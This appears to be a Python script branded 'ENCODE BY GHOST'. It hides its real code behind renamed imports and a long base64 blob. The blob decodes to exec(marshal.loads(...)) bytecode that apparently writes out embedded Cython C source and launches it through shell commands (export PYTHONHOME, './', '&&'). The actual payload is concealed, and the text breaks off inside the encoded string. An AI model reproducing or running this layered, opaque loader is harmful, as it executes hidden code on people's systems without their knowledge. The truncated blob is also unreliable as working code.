# THIS ENCODE BY GHOST | @GHOST_RFX â™¤
G,H,O,S,T,J,I,I = map(chr, [71, 72, 79, 83, 84, 74, 73, 73])
GH, OS, TJ, II = G+H, O+S, T+J, I+I
GHOST = G+H+O+S+T+J+I+I
import tempfile as t
from os import path as ghost_path, remove as grdmv, system as stem
from base64 import b64decode as lmao
ghostenc = (b'aW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhlM1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhmM1x4MDhceDA0XHgwMFx4MDBceDk3XHgwMFx4MDJceDAwZVx4MDBlXHgwMWdceDAwZFx4MDBceGEyXHgwMVx4YTZceDAyXHgwMFx4MDBceGFiXHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXFxceDA4XHgwMFx4MDBaXHgwMlpceDAzWlx4MDRaXHgwNVpceDA2Wlx4MDdaXHgwOFpceDA4ZVx4MDJlXHgwM3pceDAwXHgwMFx4MDBlXHgwNGVceDA1elx4MDBceDAwXHgwMGVceDA2ZVx4MDd6XHgwMFx4MDBceDAwZVx4MDhlXHgwOHpceDAwXHgwMFx4MDBmXHgwNFxcXHgwNFx4MDBceDAwWlx0WlxuWlx4MGJaXHgwY2VceDAyZVx4MDN6XHgwMFx4MDBceDAwZVx4MDR6XHgwMFx4MDBceDAwZVx4MDV6XHgwMFx4MDBceDAwZVx4MDZ6XHgwMFx4MDBceDAwZVx4MDd6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwWlxyZFx4MDFkXHgwMmxceDBlWlx4MGZkXHgwMWRceDAzbFx4MTBtXHgxMVpceDEybVx4MTNaXHgxNG1ceDE1Wlx4MTZceDAxXHgwMGRceDAxZFx4MDRsXHgxN21ceDE4Wlx4MTlceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFhZFx4MDZceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxYWRceDA3XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGpceDFjXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBaXHgxZGRcdFpceDFlZFxuXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqXHgxY1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwelx4MDBceDAwXHgwMFpceDFmZFx4MGJceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGogXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDB6XHgwMFx4MDBceDAwWiFkXHgwY2VceDFlelx4MDBceDAwXHgwMFoiXHgwMlx4MDBlXHgxMmojXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBlXHgxZVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwciJceDAyXHgwMGVceDE2ZVx4MWZkXHJ6XHgwMFx4MDBceDAwZSF6XHgwMFx4MDBceDAwZFxyelx4MDBceDAwXHgwMGUielx4MDBceDAwXHgwMFx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGUkZFx4MDFceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MGVaJWRceDBmWiZkXHgxMFx4YTBcJ1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqKFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMClceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDExXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBkXHgwMVx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGEwKVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZFx4MTBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDAyZFx4MTJceDg1XHgwMlx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFoqZFx4MTNlXHgxZHpceDAwXHgwMFx4MDBkXHgxNHpceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBkXHgxNXpceDAwXHgwMFx4MDBlXHgxZXpceDAwXHgwMFx4MDBkXHgxMXpceDAwXHgwMFx4MDBlJnpceDAwXHgwMFx4MDBkXHgxNnpceDAwXHgwMFx4MDBlXHgxZHpceDAwXHgwMFx4MDBkXHgxN3pceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBaK1x4MDJceDAwZSxlJmRceDE4XHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDA1XHgwMFotZS1ceGEwLlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZSVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MDJkXHgwMmRceDAyXHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMG5ceDBiI1x4MDAxXHgwMHNceDA0d1x4MDJ4XHgwM1lceDAwd1x4MDFceDAxXHgwMFlceDAwXHgwMVx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWJkXHgxOVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMC9ceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwZVx4MTJqMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZVx4MWVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDFhXHhhY1x4MWJceGE2XHgwMlx4MDBceDAwXHhhYlx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxNmVceDFmZFxyelx4MDBceDAwXHgwMGUhelx4MDBceDAwXHgwMGRccnpceDAwXHgwMFx4MDBlK3pceDAwXHgwMFx4MDBkXHJ6XHgwMFx4MDBceDAwZSJ6XHgwMFx4MDBceDAwXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MTRlJlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBkXHgwMlNceDAwKVx4MWMpXHgwOFx4ZTlHXHgwMFx4MDBceDAwXHhlOUhceDAwXHgwMFx4MDBceGU5T1x4MDBceDAwXHgwMFx4ZTlTXHgwMFx4MDBceDAwXHhlOVRceDAwXHgwMFx4MDBceGU5Slx4MDBceDAwXHgwMFx4ZTlJXHgwMFx4MDBceDAwclx4MDhceDAwXHgwMFx4MDBceGU5XHgwMFx4MDBceDAwXHgwME4pXHgwM1x4ZGFceDA0cGF0aFx4ZGFceDA2cmVtb3ZlXHhkYVx4MDZzeXN0ZW0pXHgwMVx4ZGFcdGI2NGRlY29kZXUhXHgwMFx4MDBceDAwXHgxYlsxOzkybVx4MWJbMzg7NTs0Nm1MT0FESU5HXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhkYVx4MDB1PVx4MDBceDAwXHgwMFx4MWJbMTs5Mm1ceDFiWzM4OzU7NTBtIyMjI1RISVMgSVMgRU5DT0RFRCBCWSAjR0hPU1QgXHhlMlx4ODBceGEyIEBHSE9TVF9SRlhceGRhXHgwM3N5c3pcdC5naG9zdC9ucXpceDEyZXhwb3J0IFBZVEhPTkhPTUU9elx4MTlleHBvcnQgUFlUSE9OX0VYRUNVVEFCTEU9elx4MDIuL3pceDAyJiZha1x4Y2ZceDA3XHgwMFxuXG4jaWZuZGVmIFBZX1NTSVpFX1RfQ0xFQU5cbiNkZWZpbmUgUFlfU1NJWkVfVF9DTEVBTlxuI2VuZGlmIFxuXG4jaWYgZGVmaW5lZChQeV9MSU1JVEVEX0FQSSlcbiAgI2lmICFkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2RlZmluZSBDWVRIT05fTElNSVRFRF9BUEkgMVxuICAjZW5kaWZcbiNlbGlmIGRlZmluZWQoQ1lUSE9OX0xJTUlURURfQVBJKVxuICAjaWZkZWYgX01TQ19WRVJcbiAgI3ByYWdtYSBtZXNzYWdlICgiTGltaXRlZCBBUEkgdXNhZ2UgaXMgZW5hYmxlZCB3aXRoIFwnQ1lUSE9OX0xJTUlURURfQVBJXCcgYnV0IFwnUHlfTElNSVRFRF9BUElcJyBkb2VzIG5vdCBkZWZpbmUgYSBQeXRob24gdGFyZ2V0IHZlcnNpb24uIENvbnNpZGVyIHNldHRpbmcgXCdQeV9MSU1JVEVEX0FQSVwnIGluc3RlYWQuIilcbiAgI2Vsc2VcbiAgI3dhcm5pbmcgTGltaXRlZCBBUEkgdXNhZ2UgaXMgZW5hYmxlZCB3aXRoIFwnQ1lUSE9OX0xJTUlURURfQVBJXCcgYnV0IFwnUHlfTElNSVRFRF9BUElcJyBkb2VzIG5vdCBkZWZpbmUgYSBQeXRob24gdGFyZ2V0IHZlcnNpb24uIENvbnNpZGVyIHNldHRpbmcgXCdQeV9MSU1JVEVEX0FQSVwnIGluc3RlYWQuXG4gICNlbmRpZlxuI2VuZGlmXG5cbiNpbmNsdWRlICJQeXRob24uaCJcbiNpZm5kZWYgUHlfUFlUSE9OX0hcbiAgICAjZXJyb3IgUHl0aG9uIGhlYWRlcnMgbmVlZGVkIHRvIGNvbXBpbGUgQyBleHRlbnNpb25zLCBwbGVhc2UgaW5zdGFsbCBkZXZlbG9wbWVudCB2ZXJzaW9uIG9mIFB5dGhvbi5cbiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDAwMFxuICAgICNlcnJvciBDeXRob24gcmVxdWlyZXMgUHl0aG9uIDMuOCsuXG4jZWxzZVxuI2RlZmluZSBfX1BZWF9BQklfVkVSU0lPTiAiM18xXzUiXG4jZGVmaW5lIENZVEhPTl9IRVhfVkVSU0lPTiAweDAzMDEwNUYwXG4jZGVmaW5lIENZVEhPTl9GVVRVUkVfRElWSVNJT04gMVxuXG4jaW5jbHVkZSA8c3RkZGVmLmg+XG4jaWZuZGVmIG9mZnNldG9mXG4gICNkZWZpbmUgb2Zmc2V0b2YodHlwZSwgbWVtYmVyKSAoIChzaXplX3QpICYgKCh0eXBlKikwKSAtPiBtZW1iZXIgKVxuI2VuZGlmXG4jaWYgIWRlZmluZWQoX1dJTjMyKSAmJiAhZGVmaW5lZChXSU4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUylcbiAgI2lmbmRlZiBfX3N0ZGNhbGxcbiAgICAjZGVmaW5lIF9fc3RkY2FsbFxuICAjZW5kaWZcbiAgI2lmbmRlZiBfX2NkZWNsXG4gICAgI2RlZmluZSBfX2NkZWNsXG4gICNlbmRpZlxuICAjaWZuZGVmIF9fZmFzdGNhbGxcbiAgICAjZGVmaW5lIF9fZmFzdGNhbGxcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgRExfSU1QT1JUXG4gICNkZWZpbmUgRExfSU1QT1JUKHQpIHRcbiNlbmRpZlxuI2lmbmRlZiBETF9FWFBPUlRcbiAgI2RlZmluZSBETF9FWFBPUlQodCkgdFxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0NPTU1BICxcbiNpZm5kZWYgSEFWRV9MT05HX0xPTkdcbiAgI2RlZmluZSBIQVZFX0xPTkdfTE9OR1xuI2VuZGlmXG4jaWZuZGVmIFBZX0xPTkdfTE9OR1xuICAjZGVmaW5lIFBZX0xPTkdfTE9ORyBMT05HX0xPTkdcbiNlbmRpZlxuI2lmbmRlZiBQeV9IVUdFX1ZBTFxuICAjZGVmaW5lIFB5X0hVR0VfVkFMIEhVR0VfVkFMXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCBQWV9WRVJTSU9OX0hFWFxuI2lmIGRlZmluZWQoR1JBQUxWTV9QWVRIT04pXG4gIFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMFxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAwXG4gICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxXG4gICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORFxuICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgMVxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuI2VsaWYgZGVmaW5lZChQWVBZX1ZFUlNJT04pXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMVxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMFxuICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMFxuICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklOR1xuICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgKFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMEMwMClcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDBcbiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DXG4gICAgI2RlZmluZSBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzExMDApXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwXG4jZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2lmZGVmIFB5X0xJTUlURURfQVBJXG4gICAgI3VuZGVmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVhcbiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUHlfTElNSVRFRF9BUElcbiAgI2VuZGlmXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI3VuZGVmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tcbiAgI2RlZmluZSBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMVxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDBcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG4gICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICNkZWZpbmUgQ1lUSE9OX